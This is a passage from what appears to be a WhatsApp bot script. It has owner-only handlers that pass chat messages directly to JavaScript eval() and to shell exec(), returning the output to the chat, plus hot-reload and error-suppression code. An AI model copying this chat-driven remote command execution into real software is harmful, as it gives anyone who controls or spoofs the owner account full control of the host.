                    if (!isCreator) return deltacrashrevolutionReply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await deltacrashrevolutionReply(evaled)
                    } catch (err) {
                        await deltacrashrevolutionReply(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return deltacrashrevolutionReply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return deltacrashrevolutionReply(err)
                        if (stdout) return deltacrashrevolutionReply(stdout)
                    })
                }
        }
    } catch (err) {
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})